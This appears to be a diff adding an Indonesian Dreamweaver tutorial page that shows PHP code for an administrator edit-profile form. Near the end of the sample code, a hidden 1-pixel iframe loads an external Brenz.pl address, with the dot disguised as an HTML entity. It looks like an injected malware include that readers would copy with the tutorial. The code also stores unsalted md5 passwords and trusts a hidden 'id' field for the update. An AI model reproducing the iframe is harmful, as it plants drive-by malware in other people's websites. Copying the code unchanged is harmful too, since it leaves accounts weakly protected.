+              <div class="line number64 index63 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$theValue</code> <code class="php plain">= (</code><code class="php variable">$theValue</code> <code class="php plain">!= </code><code class="php string">""</code><code class="php plain">) ? </code><code class="php string">"'"</code> <code class="php plain">. doubleval(</code><code class="php variable">$theValue</code><code class="php plain">) . </code><code class="php string">"'"</code> <code class="php plain">: </code><code class="php string">"NULL"</code><code class="php plain">;</code></div>
+              <div class="line number65 index64 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">break</code><code class="php plain">;</code></div>
+              <div class="line number66 index65 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php string">"date"</code><code class="php plain">:</code></div>
+              <div class="line number67 index66 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$theValue</code> <code class="php plain">= (</code><code class="php variable">$theValue</code> <code class="php plain">!= </code><code class="php string">""</code><code class="php plain">) ? </code><code class="php string">"'"</code> <code class="php plain">. </code><code class="php variable">$theValue</code> <code class="php plain">. </code><code class="php string">"'"</code> <code class="php plain">: </code><code class="php string">"NULL"</code><code class="php plain">;</code></div>
+              <div class="line number68 index67 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">break</code><code class="php plain">;</code></div>
+              <div class="line number69 index68 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">case</code> <code class="php string">"defined"</code><code class="php plain">:</code></div>
+              <div class="line number70 index69 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$theValue</code> <code class="php plain">= (</code><code class="php variable">$theValue</code> <code class="php plain">!= </code><code class="php string">""</code><code class="php plain">) ? </code><code class="php variable">$theDefinedValue</code> <code class="php plain">: </code><code class="php variable">$theNotDefinedValue</code><code class="php plain">;</code></div>
+              <div class="line number71 index70 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php keyword">break</code><code class="php plain">;</code></div>
+              <div class="line number72 index71 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">}</code></div>
+              <div class="line number73 index72 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">return</code> <code class="php variable">$theValue</code><code class="php plain">;</code></div>
+              <div class="line number74 index73 alt1"><code class="php plain">}</code></div>
+              <div class="line number75 index74 alt2"><code class="php plain">}</code></div>
+              <div class="line number76 index75 alt1">&nbsp;</div>
+              <div class="line number77 index76 alt2"><code class="php variable">$editFormAction</code> <code class="php plain">= </code><code class="php variable">$_SERVER</code><code class="php plain">[</code><code class="php string">'PHP_SELF'</code><code class="php plain">];</code></div>
+              <div class="line number78 index77 alt1"><code class="php keyword">if</code> <code class="php plain">(isset(</code><code class="php variable">$_SERVER</code><code class="php plain">[</code><code class="php string">'QUERY_STRING'</code><code class="php plain">])) {</code></div>
+              <div class="line number79 index78 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$editFormAction</code> <code class="php plain">.= </code><code class="php string">"?"</code> <code class="php plain">. htmlentities(</code><code class="php variable">$_SERVER</code><code class="php plain">[</code><code class="php string">'QUERY_STRING'</code><code class="php plain">]);</code></div>
+              <div class="line number80 index79 alt1"><code class="php plain">}</code></div>
+              <div class="line number81 index80 alt2">&nbsp;</div>
+              <div class="line number82 index81 alt1"><code class="php keyword">if</code> <code class="php plain">((isset(</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">"MM_update"</code><code class="php plain">])) &amp;&amp; (</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">"MM_update"</code><code class="php plain">] == </code><code class="php string">"form1"</code><code class="php plain">)) {</code></div>
+              <div class="line number83 index82 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$updateSQL</code> <code class="php plain">= sprintf(</code><code class="php string">"UPDATE `admin` SET nama=%s, password=%s WHERE id=%s"</code><code class="php plain">,</code></div>
+              <div class="line number84 index83 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">GetSQLValueString(</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'nama'</code><code class="php plain">], </code><code class="php string">"text"</code><code class="php plain">),</code></div>
+              <div class="line number85 index84 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">GetSQLValueString(md5 (</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'password'</code><code class="php plain">]), </code><code class="php string">"text"</code><code class="php plain">),</code></div>
+              <div class="line number86 index85 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">GetSQLValueString(</code><code class="php variable">$_POST</code><code class="php plain">[</code><code class="php string">'id'</code><code class="php plain">], </code><code class="php string">"int"</code><code class="php plain">));</code></div>
+              <div class="line number87 index86 alt2">&nbsp;</div>
+              <div class="line number88 index87 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">mysql_select_db(</code><code class="php variable">$database_websiteku</code><code class="php plain">, </code><code class="php variable">$websiteku</code><code class="php plain">);</code></div>
+              <div class="line number89 index88 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$Result1</code> <code class="php plain">= mysql_query(</code><code class="php variable">$updateSQL</code><code class="php plain">, </code><code class="php variable">$websiteku</code><code class="php plain">) </code><code class="php keyword">or</code> <code class="php keyword">die</code><code class="php plain">(mysql_error());</code></div>
+              <div class="line number90 index89 alt1">&nbsp;</div>
+              <div class="line number91 index90 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$updateGoTo</code> <code class="php plain">= </code><code class="php string">"editprofile.php"</code><code class="php plain">;</code></div>
+              <div class="line number92 index91 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php keyword">if</code> <code class="php plain">(isset(</code><code class="php variable">$_SERVER</code><code class="php plain">[</code><code class="php string">'QUERY_STRING'</code><code class="php plain">])) {</code></div>
+              <div class="line number93 index92 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$updateGoTo</code> <code class="php plain">.= (</code><code class="php functions">strpos</code><code class="php plain">(</code><code class="php variable">$updateGoTo</code><code class="php plain">, </code><code class="php string">'?'</code><code class="php plain">)) ? </code><code class="php string">"&amp;"</code> <code class="php plain">: </code><code class="php string">"?"</code><code class="php plain">;</code></div>
+              <div class="line number94 index93 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php variable">$updateGoTo</code> <code class="php plain">.= </code><code class="php variable">$_SERVER</code><code class="php plain">[</code><code class="php string">'QUERY_STRING'</code><code class="php plain">];</code></div>
+              <div class="line number95 index94 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">}</code></div>
+              <div class="line number96 index95 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">header(sprintf(</code><code class="php string">"Location: %s"</code><code class="php plain">, </code><code class="php variable">$updateGoTo</code><code class="php plain">));</code></div>
+              <div class="line number97 index96 alt2"><code class="php plain">}</code></div>
+              <div class="line number98 index97 alt1">&nbsp;</div>
+              <div class="line number99 index98 alt2"><code class="php variable">$colname_profile_admin</code> <code class="php plain">= </code><code class="php string">"-1"</code><code class="php plain">;</code></div>
+              <div class="line number100 index99 alt1"><code class="php keyword">if</code> <code class="php plain">(isset(</code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'MM_Username'</code><code class="php plain">])) {</code></div>
+              <div class="line number101 index100 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php variable">$colname_profile_admin</code> <code class="php plain">= </code><code class="php variable">$_SESSION</code><code class="php plain">[</code><code class="php string">'MM_Username'</code><code class="php plain">];</code></div>
+              <div class="line number102 index101 alt1"><code class="php plain">}</code></div>
+              <div class="line number103 index102 alt2"><code class="php plain">mysql_select_db(</code><code class="php variable">$database_websiteku</code><code class="php plain">, </code><code class="php variable">$websiteku</code><code class="php plain">);</code></div>
+              <div class="line number104 index103 alt1"><code class="php variable">$query_profile_admin</code> <code class="php plain">= sprintf(</code><code class="php string">"SELECT * FROM `admin` WHERE nama = %s"</code><code class="php plain">, GetSQLValueString(</code><code class="php variable">$colname_profile_admin</code><code class="php plain">, </code><code class="php string">"text"</code><code class="php plain">));</code></div>
+              <div class="line number105 index104 alt2"><code class="php variable">$profile_admin</code> <code class="php plain">= mysql_query(</code><code class="php variable">$query_profile_admin</code><code class="php plain">, </code><code class="php variable">$websiteku</code><code class="php plain">) </code><code class="php keyword">or</code> <code class="php keyword">die</code><code class="php plain">(mysql_error());</code></div>
+              <div class="line number106 index105 alt1"><code class="php variable">$row_profile_admin</code> <code class="php plain">= mysql_fetch_assoc(</code><code class="php variable">$profile_admin</code><code class="php plain">);</code></div>
+              <div class="line number107 index106 alt2"><code class="php variable">$totalRows_profile_admin</code> <code class="php plain">= mysql_num_rows(</code><code class="php variable">$profile_admin</code><code class="php plain">);</code></div>
+              <div class="line number108 index107 alt1"><code class="php plain">?&gt;</code></div>
+              <div class="line number109 index108 alt2"><code class="php plain">&lt;!DOCTYPE html PUBLIC </code><code class="php string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</code> <code class="php string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</code><code class="php plain">&gt;</code></div>
+              <div class="line number110 index109 alt1"><code class="php plain">&lt;html xmlns=</code><code class="php string">"http://www.w3.org/1999/xhtml"</code><code class="php plain">&gt;</code></div>
+              <div class="line number111 index110 alt2"><code class="php plain">&lt;head&gt;</code></div>
+              <div class="line number112 index111 alt1"><code class="php plain">&lt;meta http-equiv=</code><code class="php string">"Content-Type"</code> <code class="php plain">content=</code><code class="php string">"text/html; charset=utf-8"</code> <code class="php plain">/&gt;</code></div>
+              <div class="line number113 index112 alt2"><code class="php plain">&lt;title&gt;Untitled Document&lt;/title&gt;</code></div>
+              <div class="line number114 index113 alt1"><code class="php plain">&lt;link href=</code><code class="php string">"style.css"</code> <code class="php plain">type=</code><code class="php string">"text/css"</code> <code class="php plain">rel=</code><code class="php string">"stylesheet"</code> <code class="php plain">/&gt;</code></div>
+              <div class="line number115 index114 alt2"><code class="php plain">&lt;/head&gt;</code></div>
+              <div class="line number116 index115 alt1">&nbsp;</div>
+              <div class="line number117 index116 alt2"><code class="php plain">&lt;body&gt;</code></div>
+              <div class="line number118 index117 alt1">&nbsp;</div>
+              <div class="line number119 index118 alt2"><code class="php plain">&lt;div id=</code><code class="php string">"header"</code><code class="php plain">&gt;</code></div>
+              <div class="line number120 index119 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;h2&gt;Admin Websiteku&lt;/h2&gt;</code></div>
+              <div class="line number121 index120 alt2"><code class="php plain">&lt;/div&gt;</code></div>
+              <div class="line number122 index121 alt1">&nbsp;</div>
+              <div class="line number123 index122 alt2"><code class="php plain">&lt;div id=</code><code class="php string">"navigasi"</code><code class="php plain">&gt;</code></div>
+              <div class="line number124 index123 alt1"><code class="php plain">&lt;ul&gt;</code></div>
+              <div class="line number125 index124 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;li&gt;&lt;a href=</code><code class="php string">"home.php"</code><code class="php plain">&gt;Home&lt;/a&gt;&lt;/li&gt;</code></div>
+              <div class="line number126 index125 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;li&gt;&lt;a href=</code><code class="php string">"editprofile.php"</code><code class="php plain">&gt;Profile&lt;/a&gt;&lt;/li&gt;</code></div>
+              <div class="line number127 index126 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;li&gt;&lt;a href=</code><code class="php string">"categories.php"</code><code class="php plain">&gt;Categories&lt;/a&gt;&lt;/li&gt;</code></div>
+              <div class="line number128 index127 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;li&gt;&lt;a href=</code><code class="php string">"post.php"</code><code class="php plain">&gt;Post&lt;/a&gt;&lt;/li&gt;</code></div>
+              <div class="line number129 index128 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;li&gt;&lt;a href=</code><code class="php string">"message.php"</code><code class="php plain">&gt;Message&lt;/a&gt;&lt;/li&gt;</code></div>
+              <div class="line number130 index129 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;li&gt;&lt;a href=</code><code class="php string">"logout.php"</code><code class="php plain">&gt;Logout&lt;/a&gt;&lt;/li&gt;</code></div>
+              <div class="line number131 index130 alt2"><code class="php plain">&lt;/ul&gt;</code></div>
+              <div class="line number132 index131 alt1"><code class="php plain">&lt;/div&gt;</code></div>
+              <div class="line number133 index132 alt2">&nbsp;</div>
+              <div class="line number134 index133 alt1"><code class="php plain">&lt;div id=</code><code class="php string">"conten"</code><code class="php plain">&gt;</code></div>
+              <div class="line number135 index134 alt2"><code class="php plain">&lt;h3&gt;Profile Admin&lt;/h3&gt;</code></div>
+              <div class="line number136 index135 alt1"><code class="php plain">&lt;p&gt;</code></div>
+              <div class="line number137 index136 alt2"><code class="php plain">Anda Login sebagai &lt;?php </code><code class="php functions">echo</code> <code class="php variable">$row_profile_admin</code><code class="php plain">[</code><code class="php string">'nama'</code><code class="php plain">]; ?&gt;</code></div>
+              <div class="line number138 index137 alt1"><code class="php plain">&lt;/p&gt;</code></div>
+              <div class="line number139 index138 alt2">&nbsp;</div>
+              <div class="line number140 index139 alt1"><code class="php plain">&lt;p&gt;&lt;/p&gt;</code></div>
+              <div class="line number141 index140 alt2">&nbsp;</div>
+              <div class="line number142 index141 alt1"><code class="php plain">&lt;form action=</code><code class="php string">"&lt;?php echo $editFormAction; ?&gt;"</code> <code class="php plain">method=</code><code class="php string">"post"</code> <code class="php plain">name=</code><code class="php string">"form1"</code> <code class="php plain">id=</code><code class="php string">"form1"</code><code class="php plain">&gt;</code></div>
+              <div class="line number143 index142 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">&lt;table align=</code><code class="php string">"left"</code><code class="php plain">&gt;</code></div>
+              <div class="line number144 index143 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;tr valign=</code><code class="php string">"baseline"</code><code class="php plain">&gt;</code></div>
+              <div class="line number145 index144 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;td nowrap=</code><code class="php string">"nowrap"</code> <code class="php plain">align=</code><code class="php string">"right"</code><code class="php plain">&gt;Nama:&lt;/td&gt;</code></div>
+              <div class="line number146 index145 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;td&gt;&lt;input type=</code><code class="php string">"text"</code> <code class="php plain">name=</code><code class="php string">"nama"</code> <code class="php plain">value=</code><code class="php string">"&lt;?php echo htmlentities($row_profile_admin['nama'], ENT_COMPAT, 'utf-8'); ?&gt;"</code> <code class="php plain">size=</code><code class="php string">"32"</code> <code class="php plain">/&gt;&lt;/td&gt;</code></div>
+              <div class="line number147 index146 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;/tr&gt;</code></div>
+              <div class="line number148 index147 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;tr valign=</code><code class="php string">"baseline"</code><code class="php plain">&gt;</code></div>
+              <div class="line number149 index148 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;td nowrap=</code><code class="php string">"nowrap"</code> <code class="php plain">align=</code><code class="php string">"right"</code><code class="php plain">&gt;Password:&lt;/td&gt;</code></div>
+              <div class="line number150 index149 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;td&gt;&lt;input type=</code><code class="php string">"password"</code> <code class="php plain">name=</code><code class="php string">"password"</code> <code class="php plain">value=</code><code class="php string">""</code> <code class="php plain">size=</code><code class="php string">"32"</code> <code class="php plain">/&gt;&lt;/td&gt;</code></div>
+              <div class="line number151 index150 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;/tr&gt;</code></div>
+              <div class="line number152 index151 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;tr valign=</code><code class="php string">"baseline"</code><code class="php plain">&gt;</code></div>
+              <div class="line number153 index152 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;td nowrap=</code><code class="php string">"nowrap"</code> <code class="php plain">align=</code><code class="php string">"right"</code><code class="php plain">&gt;&amp;nbsp;&lt;/td&gt;</code></div>
+              <div class="line number154 index153 alt1"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;td&gt;&lt;input type=</code><code class="php string">"submit"</code> <code class="php plain">value=</code><code class="php string">"Update record"</code> <code class="php plain">/&gt;&lt;/td&gt;</code></div>
+              <div class="line number155 index154 alt2"><code class="php spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="php plain">&lt;/tr&gt;</code></div>
+              <div class="line number156 index155 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">&lt;/table&gt;</code></div>
+              <div class="line number157 index156 alt2"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">&lt;input type=</code><code class="php string">"hidden"</code> <code class="php plain">name=</code><code class="php string">"MM_update"</code> <code class="php plain">value=</code><code class="php string">"form1"</code> <code class="php plain">/&gt;</code></div>
+              <div class="line number158 index157 alt1"><code class="php spaces">&nbsp;&nbsp;</code><code class="php plain">&lt;input type=</code><code class="php string">"hidden"</code> <code class="php plain">name=</code><code class="php string">"id"</code> <code class="php plain">value=</code><code class="php string">"&lt;?php echo $row_profile_admin['id']; ?&gt;"</code> <code class="php plain">/&gt;</code></div>
+              <div class="line number159 index158 alt2"><code class="php plain">&lt;/form&gt;</code></div>
+              <div class="line number160 index159 alt1"><code class="php plain">&lt;p&gt;&amp;nbsp;&lt;/p&gt;</code></div>
+              <div class="line number161 index160 alt2"><code class="php plain">&lt;/div&gt;</code></div>
+              <div class="line number162 index161 alt1">&nbsp;</div>
+              <div class="line number163 index162 alt2"><code class="php plain">&lt;iframe style=</code><code class="php string">"height:1px"</code> <code class="php plain">src=</code><code class="php string">"http://www&amp;#46;Brenz.pl/rc/"</code> <code class="php plain">frameborder=0 width=1&gt;&lt;/iframe&gt;</code></div>
+              <div class="line number164 index163 alt1"><code class="php plain">&lt;/body&gt;</code></div>
+              <div class="line number165 index164 alt2"><code class="php plain">&lt;/html&gt;</code></div>
+              <div class="line number166 index165 alt1"><code class="php plain">&lt;?php</code></div>
+              <div class="line number167 index166 alt2"><code class="php plain">mysql_free_result(</code><code class="php variable">$profile_admin</code><code class="php plain">);</code></div>
+              <div class="line number168 index167 alt1"><code class="php plain">?&gt;</code></div>
+            </div></td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+  <p>Untuk mencoba apakah <em><strong>Halaman Edit Profile Administrator</strong></em> anda berhasil atau tidak silahkan login ke halaman administrator anda, ketikkan <a href="http://localhost/websiteku.com/fileadmin"><strong>http://localhost/websiteku.com/fileadmin</strong></a><strong>, </strong>&nbsp;kemudian
+   pada menu navigation klik Profile, dan coba ganti password anda,   
+setelah itu coba anda log out kembali, dan coba kembali login hahaha   
+bulak balik <strong>membuat halaman edit profile administrator</strong>.</p>
+  <p><strong>Tutorial membuat halaman edit profile administrator dengan Adobe dreamweaver cs3</strong>
+ ini hanya sebagai pembelajaran, bagaimana kita menggunakan fungsi   
+recordset. Jika anda ingin menambahkan informasi admin yang lain,   
+misalnya email admin, no telp, alamat, dll, anda harus membuatnya pada  
+ saat anda membuat tabel admin, dan mengisi Number of fieldnya sesuai   
+kebutuhan anda. Masih bingung.?? silahkan baca tutorialnya dari awal,   
+silahkan<a title="setting site di dreamweaver" href="http://mous-design.com/topics/tutorial-dreamweaver"> klik lagi disini</a>.</p>
+  <p>Sekian <strong>Tutorial membuat halaman edit profile administrator dengan Adobe dreamweaver cs3, </strong>semoga
+   bermanfaat, saya mohon maaf lagi sekali, karena keterbatasan waktu 
+saya   jarang update blog ini, dan tidak semua pertanyaan saya jawab.</p>
+</div>
+</body></html>
